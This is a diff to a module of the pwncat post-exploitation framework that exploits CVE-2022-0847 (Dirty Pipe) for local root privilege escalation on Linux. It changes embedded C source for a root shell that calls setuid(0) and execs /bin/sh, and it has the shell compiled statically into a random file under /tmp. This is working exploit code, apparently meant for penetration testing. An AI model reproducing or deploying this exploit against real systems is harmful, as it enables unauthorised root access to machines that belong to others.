@@ -14,12 +14,6 @@ from pwncat.platform.linux import Linux
 from pwncat.platform import PlatformError, Path
 from pwncat.channel import ChannelError
 
-def errcheck(result, func, args):
-    if not result:
-        print("NORESULT")
-    else:
-        print(result)
-
 class Module(BaseModule):
     """ Exploit CVE-2022-0847 to local privesc to root via dirtypipe """
 
@@ -235,26 +229,32 @@ class Module(BaseModule):
                 #include <stdio.h>
                 #include <stdlib.h>
                 #include <unistd.h>
+
                 int main(int argc, char *argv[]) {{
                     setuid(0); setgid(0);
                     seteuid(0); setegid(0);
-                    execve("/bin/sh", ["/bin/sh", NULL], [NULL]);
+                    char *args[] = {{ "/bin/sh", NULL }};
+                    execve("/bin/sh", args, NULL );                    
                 }}
-                """
+            """
         ).lstrip()
 
         current_user = session.current_user()
         orig_id = current_user.id
 
-        with session.platform.tempfile(mode="w", directory="/tmp") as filp:
-            rootshell = filp.name
+        rootshell = "/tmp/" + util.random_string(8)
 
         # Compile dirtypipez exploit binary
         try:
             session.log("compiling dirtypipe exploit")            
             yield Status("compiling dirtypipe exploit")
+
+            # OK, you should never static link glibc, but since pwncat has a bug
+            # in its compile targeting we need to make sure the rootshell won't 
+            # have glibc compat issues. Caleb is aware of the issue.
             rootshell = session.platform.compile(
                 [StringIO(dirtypipez_source)],
+                cflags=["-static", "-s"],
                 output=rootshell
             )
         except PlatformError as exc:
